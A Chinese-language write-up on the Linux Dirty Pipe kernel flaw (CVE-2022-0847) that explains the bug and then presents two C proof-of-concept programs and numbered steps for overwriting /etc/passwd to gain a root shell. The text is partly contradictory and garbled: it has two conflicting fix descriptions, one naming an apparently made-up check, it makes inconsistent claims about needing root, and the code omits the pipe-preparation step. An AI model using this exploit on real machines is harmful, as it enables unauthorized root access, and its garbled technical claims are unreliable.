**修复**：Linux内核5.16.11、5.15.25、5.10.102中修复了该漏洞，补丁在`pipe_write`中增加了对`PAGE_CACHE_DIRTY`标志的检查，并禁止对共享页的写入。用户应升级内核至安全版本。

Dirty Pipe漏洞（CVE-2022-0847）是Linux内核5.8至5.16.11版本中pipe子系统的一个未授权写漏洞。漏洞成因在于内核函数`pipe_write`在处理管道写入时，如果管道缓冲区（pipe_buffer）的`flags`字段包含`PIPE_BUF_FLAG_CAN_MERGE`标志，则允许新写入的数据与缓冲区中已有的数据合并。然而，当通过`splice`系统调用将文件页（page cache）直接映射到管道缓冲区时，该标志没有被正确清除，导致后续对管道的写入操作可以修改这些映射的页面，即使这些页面原本是只读的（如只读文件、只读内存映射）。

受影响版本：Linux内核5.8至5.16.11（5.10.102、5.15.25、5.16.11已修复）。

POC原理：攻击者首先打开一个只读文件（如/etc/passwd），然后创建一个管道。通过`splice`将文件内容（一个页面）从文件描述符移动到管道写入端，此时管道缓冲区指向该文件页。接着，攻击者向管道写入端写入少量数据（小于页面大小），由于`PIPE_BUF_FLAG_CAN_MERGE`标志存在，写入的数据会直接覆盖管道缓冲区指向的文件页，从而修改了文件内容。最后，通过读取管道读出端或直接查看文件，即可看到被修改的内容。

以下是一个简单的C语言POC，用于覆盖/etc/passwd文件（仅演示，实际利用需谨慎）：

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <linux/pipe_fs_i.h>

int main() {
    // 打开只读文件
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 创建管道
    int p[2];
    if (pipe(p) < 0) {
        perror("pipe");
        return 1;
    }

    // 使用splice将文件页映射到管道缓冲区
    // splice(fd_in, off_in, fd_out, off_out, len, flags)
    // 从文件读取一个页面（4096字节）到管道写入端
    loff_t offset = 0;
    ssize_t n = splice(fd, &offset, p[1], NULL, 4096, 0);
    if (n < 0) {
        perror("splice");
        return 1;
    }
    printf("spliced %zd bytes\n", n);

    // 现在管道写入端指向文件页，且flags包含CAN_MERGE
    // 向管道写入端写入数据，覆盖文件页内容
    // 注意：写入的数据长度必须小于页面大小，且不能触发管道缓冲区重新分配
    const char *payload = "root:$6$...:0:0:root:/root:/bin/bash\n"; // 替换为实际hash
    n = write(p[1], payload, strlen(payload));
    if (n < 0) {
        perror("write");
        return 1;
    }
    printf("wrote %zd bytes\n", n);

    // 关闭文件描述符，使修改生效
    close(fd);
    close(p[0]);
    close(p[1]);

    // 验证：重新打开文件查看内容
    fd = open("/etc/passwd", O_RDONLY);
    char buf[4096];
    n = read(fd, buf, sizeof(buf));
    write(STDOUT_FILENO, buf, n);
    close(fd);

    return 0;
}
```

注意：该POC需要root权限才能修改/etc/passwd（因为文件属主是root），但漏洞本身允许任意用户修改自己可读的文件。实际提权利用中，攻击者会修改自己的用户条目，将UID改为0。

修复：Linux内核5.16.11、5.15.25、5.10.102中，补丁在`splice`操作后清除`PIPE_BUF_FLAG_CAN_MERGE`标志，防止后续写入覆盖映射页。

Dirty Pipe漏洞允许无特权的用户写入自己拥有读权限的任意文件，包括/etc/passwd（因为所有用户都有读权限）。通过修改/etc/passwd，攻击者可以将自己的用户UID改为0（root），从而获得root权限。

利用步骤：
1. 检查内核版本是否在受影响范围内（5.8 - 5.16.11）。
2. 准备一个密码哈希（例如使用`openssl passwd -6`生成）。
3. 编写POC程序，打开/etc/passwd（只读），创建管道，使用splice将文件页映射到管道缓冲区，然后向管道写入端写入修改后的用户行（将UID改为0）。
4. 编译并运行POC（需要普通用户权限，但需注意：某些系统可能限制splice系统调用，但通常允许）。
5. 运行成功后，执行`su`或`ssh`以新密码登录，即可获得root shell。

完整C代码示例（基于公开POC改进）：

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>

// 定义PIPE_BUF_FLAG_CAN_MERGE，通常为0x10
#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#endif

// 获取管道缓冲区flags的ioctl命令
#define FIONREAD 0x541B

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_file> <offset> <data>\n", argv[0]);
        fprintf(stderr, "Example: %s /etc/passwd 0 \"root:\$6\$...:0:0:root:/root:/bin/bash\\n\"\n", argv[0]);
        return 1;
    }

    const char *filename = argv[1];
    off_t offset = atol(argv[2]);
    const char *data = argv[3];
    size_t data_len = strlen(data);

    // 打开目标文件（只读）
    int fd = open(filename, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 创建管道
    int p[2];
    if (pipe(p) < 0) {
        perror("pipe");
        return 1;
    }

    // 使用splice将文件页映射到管道写入端
    // 注意：splice需要内核支持，且文件必须支持splice（常规文件支持）
    loff_t off_in = offset;
    ssize_t n = splice(fd, &off_in, p[1], NULL, data_len, 0);
    if (n < 0) {
        perror("splice");
        return 1;
    }
    printf("[+] Spliced %zd bytes from file at offset %ld\n", n, offset);

    // 现在管道缓冲区指向文件页，且flags包含CAN_MERGE
    // 向管道写入端写入数据，覆盖文件页内容
    n = write(p[1], data, data_len);
    if (n < 0) {
        perror("write");
        return 1;
    }
    printf("[+] Wrote %zd bytes to pipe\n", n);

    // 关闭文件描述符，使修改生效
    close(fd);
    close(p[0]);
    close(p[1]);

    printf("[+] Done. Check %s\n", filename);
    return 0;
}
```

